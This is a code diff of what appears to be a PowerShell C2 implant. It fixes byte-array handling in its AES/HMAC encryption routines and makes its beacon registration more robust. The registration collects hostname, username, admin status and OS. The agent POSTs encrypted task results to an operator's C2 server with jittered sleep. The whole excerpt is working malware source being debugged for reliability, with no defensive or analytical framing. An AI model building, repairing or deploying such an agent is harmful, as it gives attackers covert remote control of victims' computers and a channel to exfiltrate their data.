@@ -50,25 +50,36 @@ function Invoke-Seal {
     param([byte[]]$K,[byte[]]$P)
     $aes=[Security.Cryptography.Aes]::Create()
     $aes.KeySize=256;$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.Key=$K
-    $aes.GenerateIV();$iv=$aes.IV
-    $ct=$aes.CreateEncryptor().TransformFinalBlock($P,0,$P.Length)
+    $aes.GenerateIV();[byte[]]$iv=$aes.IV
+    [byte[]]$ct=$aes.CreateEncryptor().TransformFinalBlock($P,0,$P.Length)
     $aes.Dispose()
-    $payload=$iv+$ct
+    [byte[]]$payload=New-Object byte[] ($iv.Length+$ct.Length)
+    [Buffer]::BlockCopy($iv,0,$payload,0,$iv.Length)
+    [Buffer]::BlockCopy($ct,0,$payload,$iv.Length,$ct.Length)
     $h=[Security.Cryptography.HMACSHA256]::new($K)
-    $mac=$h.ComputeHash($payload);$h.Dispose()
-    $mac+$payload
+    [byte[]]$mac=$h.ComputeHash($payload);$h.Dispose()
+    [byte[]]$out=New-Object byte[] ($mac.Length+$payload.Length)
+    [Buffer]::BlockCopy($mac,0,$out,0,$mac.Length)
+    [Buffer]::BlockCopy($payload,0,$out,$mac.Length,$payload.Length)
+    $out
 }
 
 function Invoke-Open {
     param([byte[]]$K,[byte[]]$D)
-    $mac=$D[0..31];$payload=$D[32..($D.Length-1)]
+    [byte[]]$mac=New-Object byte[] 32
+    [Buffer]::BlockCopy($D,0,$mac,0,32)
+    [byte[]]$payload=New-Object byte[] ($D.Length-32)
+    [Buffer]::BlockCopy($D,32,$payload,0,$payload.Length)
     $h=[Security.Cryptography.HMACSHA256]::new($K)
-    $expected=$h.ComputeHash($payload);$h.Dispose()
+    [byte[]]$expected=$h.ComputeHash($payload);$h.Dispose()
     for($i=0;$i-lt32;$i++){if($mac[$i]-ne$expected[$i]){throw 'MAC verify failed'}}
-    $iv=$payload[0..15];$ct=$payload[16..($payload.Length-1)]
+    [byte[]]$iv=New-Object byte[] 16
+    [Buffer]::BlockCopy($payload,0,$iv,0,16)
+    [byte[]]$ct=New-Object byte[] ($payload.Length-16)
+    [Buffer]::BlockCopy($payload,16,$ct,0,$ct.Length)
     $aes=[Security.Cryptography.Aes]::Create()
     $aes.KeySize=256;$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.Key=$K;$aes.IV=$iv
-    $pt=$aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)
+    [byte[]]$pt=$aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)
     $aes.Dispose();$pt
 }
 
@@ -94,11 +105,12 @@ function Get-JitteredSleep {
 
 function Register-WithC2 {
     $proc=[Diagnostics.Process]::GetCurrentProcess()
-    $ia=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
+    try{$ia=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')}catch{$ia=$false}
+    try{$osName=(Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue).Caption}catch{$osName=''}
     $reg=[ordered]@{
         hostname=$env:COMPUTERNAME
         username="$env:USERDOMAIN\$env:USERNAME"
-        os=(Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue).Caption
+        os=$osName
         pid=[int]$proc.Id
         transport='http'
         sleep_sec=[int]($SleepMs/1000)
@@ -122,7 +134,7 @@ function Send-Result {
     param([long]$TaskID,[string]$Output,[string]$ErrStr='')
     $pt=[Text.Encoding]::UTF8.GetBytes(([ordered]@{task_id=$TaskID;output=$Output;error=$ErrStr}|ConvertTo-Json -Compress))
     $wc.Headers['Content-Type']='application/octet-stream'
-    $wc.UploadData("$C2/result/$AgentID",'POST',(Invoke-Seal -K $AESKey -P $pt))|Out-Null
+    $wc.UploadData("$C2/result/$AgentID",'POST',[byte[]](Invoke-Seal -K $AESKey -P $pt))|Out-Null
 }
 
 # ── Resolve path relative to CWD ─────────────────────────────────────────────
